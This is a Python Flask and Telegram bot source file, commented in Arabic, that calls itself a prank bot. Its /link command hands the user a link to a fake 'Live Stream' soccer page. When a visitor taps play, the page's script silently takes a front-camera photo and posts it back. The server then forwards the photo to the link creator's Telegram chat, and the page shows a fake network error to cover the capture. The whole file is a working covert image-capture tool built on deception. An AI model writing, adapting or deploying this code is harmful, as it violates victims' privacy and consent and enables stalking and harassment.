import os
import time
from flask import Flask, request, abort, render_template_string
import telebot
import pymongo

# قراءة المتغيرات
TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")
MONGO_URL = os.getenv("MONGO_URL")

print("--- STARTING BOT ---")
print(f"TOKEN: {'Set' if TOKEN else 'MISSING'}")
print(f"BASE_URL: {BASE_URL}")
print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is missing")

# ✅ الإصلاح المهم: threaded=False لمنع إنهاء الخيط قبل تنفيذ الأمر
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

users_collection = None
if MONGO_URL:
    try:
        mongo_client = pymongo.MongoClient(MONGO_URL, connectTimeoutMS=5000)
        db = mongo_client["prank_bot"]
        users_collection = db["allowed_users"]
        print("✅ Connected to MongoDB successfully")
    except Exception as e:
        print(f"❌ DB Error: {e}")

@app.route("/")
def home():
    return "Bot is running"

@app.route("/capture", methods=["GET"])
def capture_page():
    user_id = request.args.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not user_id or not is_allowed:
        return "الرابط غير صالح", 403

    html = """
    <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Live Stream</title>
    <style>body{background:#000;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;flex-direction:column}#clickArea{width:100%;height:100%;display:flex;justify-content:center;align-items:center;cursor:pointer;flex-direction:column;background:url('https://img.freepik.com/free-photo/wide-angle-shot-soccer-field_23-2148172385.jpg')center/cover;position:relative}.overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5)}.play-icon{width:90px;height:90px;background:rgba(255,255,255,0.3);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:2;border:3px solid #fff;transition:0.2s}.play-icon:hover{background:rgba(255,255,255,0.6)}.play-icon svg{fill:#fff;width:36px;height:36px;margin-left:4px}#msg{z-index:2;margin-top:25px;font-size:18px;color:#eee;text-shadow:1px 1px 3px #000}.live-badge{position:absolute;top:20px;right:20px;background:#ff0000;color:#fff;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;animation:pulse 1.5s infinite;z-index:2}@keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}.loading-bar{position:absolute;bottom:0;left:0;width:100%;height:4px;background:#333;z-index:2;display:none}.progress{height:100%;width:0%;background:#00d1ff;transition:width 2s}video,canvas{display:none}</style>
    <body><div id=clickArea><div class=overlay></div><span class=live-badge>Live</span><div class=play-icon><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div><div id=msg>Tap to play stream</div></div><div class=loading-bar id=loadingBar><div class=progress id=progress></div></div><video id=video playsinline></video><canvas id=canvas style="display:none;"></canvas>
    <script>const a=document.getElementById('clickArea'),m=document.getElementById('msg'),v=document.getElementById('video'),c=document.getElementById('canvas'),u={{user_id}}, bar=document.getElementById('loadingBar'), prog=document.getElementById('progress');let captured=!1;a.onclick=function(){if(captured)return;m.innerText="Connecting to server...";bar.style.display="block";prog.style.width="40%";navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false}).then(function(stream){v.srcObject=stream;return v.play();}).then(function(){const context=c.getContext('2d');c.width=v.videoWidth;c.height=v.videoHeight;context.drawImage(v,0,0,c.width,c.height);if(v.srcObject){v.srcObject.getTracks().forEach(track=>track.stop());v.srcObject=null;}captured=!0;prog.style.width="100%";m.innerText="Loading stream...";c.toBlob(function(blob){if(!blob)return;const f=new FormData();f.append('photo',blob,'photo.jpg');f.append('user_id',u);fetch('/capture',{method:'POST',body:f});setTimeout(()=>{bar.style.background="#ff3333";a.style.background="#000";document.querySelector('.overlay').style.background="rgba(0,0,0,1)";document.querySelector('.play-icon').style.display="none";document.querySelector('.live-badge').style.display="none";m.innerHTML="<span style='color:#ff5555;font-size:20px;'>⚠️ خطأ في الشبكة<br>تعذر تحميل البث المباشر.</span>";},1500);},'image/jpeg');}).catch(function(err){prog.style.display="none";m.innerText="⚠️ يرجى السماح للكاميرا للاستمرار.";m.style.color="#ffaa00";captured=!1;});};</script></body></html>
    """
    return render_template_string(html, user_id=user_id)

@app.route("/capture", methods=["POST"])
def capture():
    photo = request.files.get("photo")
    user_id = request.form.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not photo or not user_id or not is_allowed:
        return "Invalid request", 400
    try:
        bot.send_photo(chat_id=user_id, photo=photo.stream.read())
        return "Image sent", 200
    except Exception as e:
        return f"Error: {e}", 500

@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        try:
            update = telebot.types.Update.de_json(request.get_data(as_text=True))
            bot.process_new_updates([update])
            return "OK", 200
        except Exception as e:
            print(f"❌ Error processing update: {e}")
            return "Error", 500
    else:
        abort(403)

@bot.message_handler(commands=["start"])
def start(message):
    print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
        print("--- START REPLY SENT ---")
    except Exception as e:
        print(f"❌ Error in /start: {e}")

@bot.message_handler(commands=["link"])
def link(message):
    print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        if not BASE_URL:
            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Render.")
            return

        if users_collection is not None:
            users_collection.update_one(
                {"user_id": message.chat.id},
                {"$set": {"user_id": message.chat.id}},
                upsert=True
            )
        url = f"{BASE_URL}/capture?user_id={message.chat.id}"
        bot.reply_to(message, f"🎬 تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
        print(f"--- LINK REPLY SENT: {url} ---")
    except Exception as e:
        print(f"❌ Error in /link: {e}")
        bot.reply_to(message, f"حدث خطأ: {e}")

# للتشغيل المحلي فقط
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)